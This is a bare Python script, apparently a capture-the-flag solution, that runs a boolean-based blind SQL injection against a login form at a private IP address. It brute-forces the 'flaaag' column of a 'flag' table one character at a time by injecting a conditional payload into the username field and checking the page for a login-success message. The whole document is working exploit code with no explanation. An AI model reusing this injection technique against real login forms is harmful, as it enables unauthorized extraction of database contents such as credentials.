import requests
url = "http://172.20.2.2/index.php"
dicts = "1234567890{}-qwertyuiopasdfghjklzxcvbnm/;!@#$%^&*()_=QWERTYUIOPASDFGHJKLZXCVBNM"
result = ""
for i in range(1,200):
    print('==============================')
    for j in dicts:
        # payload = {"lname":"ye' or if((ascii(substr('test',{},1))={}),1,0)#".format(i,ord(j)),"lpass":"123456"}
        payload = {"lname":"ye' or if((ascii(substr((select flaaag from flag),{},1))={}),1,0)#".format(i,ord(j)),"lpass":"123456"}
        # payload = {"lname":"ye' or if((ascii(substr('test',1,1))=116),1,0)#","lpass":"123456"}
        try:
            html = requests.post(url,data=payload)
            # print(html.text.encode().decode("utf-8"))
            if "ç»å½æå!" in html.text:
                result = result + j
                print(result)
                break
        except:
            pass
